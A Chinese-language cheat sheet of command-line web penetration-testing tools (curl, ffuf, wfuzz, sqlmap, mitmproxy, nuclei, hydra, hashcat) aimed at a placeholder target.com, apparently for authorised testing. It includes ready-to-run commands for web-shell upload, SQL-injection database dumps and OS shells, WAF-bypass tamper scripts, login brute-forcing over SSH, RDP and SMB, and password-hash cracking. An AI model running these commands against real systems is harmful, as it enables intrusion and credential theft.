# 命令行 Web 测试工具

替代 Burp Suite 的命令行工具集，适合自动化和脚本化测试。

## HTTP 请求工具

### curl

```bash
# GET 请求
curl -s https://target.com/api/users

# POST (form)
curl -s -X POST https://target.com/login -d "user=admin&pass=test"

# POST (JSON)
curl -s -X POST https://target.com/api -H "Content-Type: application/json" -d '{"key":"value"}'

# 带 Cookie
curl -s -b "session=abc123" https://target.com/admin

# 带自定义头
curl -s -H "Authorization: Bearer TOKEN" -H "X-Custom: value" https://target.com/api

# 查看响应头
curl -sI https://target.com
curl -sv https://target.com 2>&1 | grep -E "^[<>]"

# 跟随重定向
curl -sL https://target.com/redirect

# 忽略 SSL 证书
curl -sk https://self-signed.target.com

# 上传文件
curl -s -X POST https://target.com/upload -F "file=@shell.php"

# 代理
curl -s -x http://127.0.0.1:8080 https://target.com
```

### httpie

```bash
# GET
http https://target.com/api

# POST
http POST https://target.com/api key=value

# 带认证
http -a admin:password https://target.com/api

# 带 Header
http https://target.com/api "Authorization: Bearer TOKEN"
```

---

## Web 模糊测试

### ffuf

```bash
# 目录模糊
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403

# 参数模糊
ffuf -u "https://target.com/api?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0

# 子域名模糊
ffuf -u https://FUZZ.target.com -w subdomains.txt -mc 200

# vhost 模糊
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200 -fs DEFAULT_SIZE

# POST 参数模糊
ffuf -u https://target.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -mc 200 -fr "Invalid"

# 多字段模糊
ffuf -u https://target.com/login -X POST -d "user=USERFUZZ&pass=PASSFUZZ" -w users.txt:USERFUZZ -w passwords.txt:PASSFUZZ -mc 200

# 过滤选项
-mc 200,301         # 匹配状态码
-fc 404,403         # 排除状态码
-ms 1000            # 匹配响应大小
-fs 0               # 排除响应大小
-mr "Success"       # 匹配正则
-fr "Error"         # 排除正则
-fl 10              # 排除行数

# 输出
-o results.json -of json
```

### wfuzz

```bash
# 目录模糊
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 https://target.com/FUZZ

# 参数模糊
wfuzz -w params.txt --hc 404 "https://target.com/api?FUZZ=test"

# POST 模糊
wfuzz -w passwords.txt -d "user=admin&pass=FUZZ" --hc 403 https://target.com/login

# 多 payload
wfuzz -w users.txt -w passwords.txt -d "user=FUZZ&pass=FUZ2Z" https://target.com/login

# Cookie 模糊
wfuzz -w wordlist.txt -b "session=FUZZ" --hc 403 https://target.com/admin
```

---

## SQL 注入工具

### sqlmap

```bash
# 基础检测
sqlmap -u "https://target.com/api?id=1" --batch

# POST 请求
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --batch

# 指定注入点
sqlmap -u "https://target.com/api?id=1*&name=test" --batch  # * 标记注入点

# 从 Burp 请求文件
sqlmap -r request.txt --batch

# 枚举数据库
sqlmap -u URL --dbs --batch
sqlmap -u URL -D database_name --tables --batch
sqlmap -u URL -D database_name -T table_name --columns --batch
sqlmap -u URL -D database_name -T table_name -C col1,col2 --dump --batch

# 获取 Shell
sqlmap -u URL --os-shell --batch
sqlmap -u URL --sql-shell --batch

# 绕过 WAF
sqlmap -u URL --tamper=space2comment,between,randomcase --batch
sqlmap -u URL --random-agent --delay=1 --batch

# 常用 tamper 脚本
# space2comment     空格转注释
# between           用 BETWEEN 替换 >
# randomcase        随机大小写
# charencode        URL 编码
# equaltolike       = 转 LIKE
# base64encode      Base64 编码

# 指定技术
--technique=BEUSTQ   # B布尔 E报错 U联合 S堆叠 T时间 Q内联
--level=5            # 测试级别 (1-5)
--risk=3             # 风险级别 (1-3)
```

---

## 流量拦截代理

### mitmproxy

```bash
# 启动代理
mitmproxy -p 8080

# 透明代理
mitmproxy --mode transparent

# 脚本模式（自动化修改请求/响应）
mitmproxy -s script.py

# 仅记录
mitmdump -p 8080 -w traffic.flow

# 回放
mitmdump -r traffic.flow

# 过滤
mitmproxy -p 8080 --set view_filter="~d target.com"
```

mitmproxy 脚本示例：

```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if "target.com" in flow.request.host:
        flow.request.headers["X-Custom"] = "injected"

def response(flow: http.HTTPFlow):
    if "admin" in flow.request.path:
        print(f"[*] Admin access: {flow.request.url}")
        print(f"    Status: {flow.response.status_code}")
        print(f"    Body: {flow.response.text[:200]}")
```

---

## 漏洞扫描

### nuclei

```bash
# 全模板扫描
nuclei -u https://target.com

# 指定严重级别
nuclei -u https://target.com -severity critical,high

# 指定标签
nuclei -u https://target.com -tags cve,misconfig,exposure

# 批量目标
nuclei -l urls.txt -severity critical,high -o results.txt

# 指定模板
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t http/misconfiguration/

# 并发控制
nuclei -u https://target.com -c 50 -rl 150   # 50 并发，150 请求/秒

# 更新模板
nuclei -ut
```

---

## 密码破解

### hydra

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4

# FTP
hydra -L users.txt -P passwords.txt ftp://TARGET -t 10

# HTTP POST 表单
hydra -L users.txt -P passwords.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 10

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt TARGET http-get /admin

# MySQL
hydra -L users.txt -P passwords.txt mysql://TARGET

# RDP
hydra -L users.txt -P passwords.txt rdp://TARGET -t 4

# SMB
hydra -L users.txt -P passwords.txt smb://TARGET
```

### hashcat

```bash
# 识别哈希类型
hashid 'HASH_VALUE'
hashcat --identify hash.txt

# 常见模式
hashcat -m 0 hash.txt wordlist.txt           # MD5
hashcat -m 100 hash.txt wordlist.txt         # SHA1
hashcat -m 1400 hash.txt wordlist.txt        # SHA256
hashcat -m 1000 hash.txt wordlist.txt        # NTLM
hashcat -m 3200 hash.txt wordlist.txt        # bcrypt
hashcat -m 1800 hash.txt wordlist.txt        # sha512crypt
hashcat -m 500 hash.txt wordlist.txt         # md5crypt
hashcat -m 16500 hash.txt wordlist.txt       # JWT

# 规则攻击
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码攻击
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a     # 6 位全字符
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d  # 如 Admin1234

# 字符集
# ?l 小写 / ?u 大写 / ?d 数字 / ?s 特殊 / ?a 全部
```
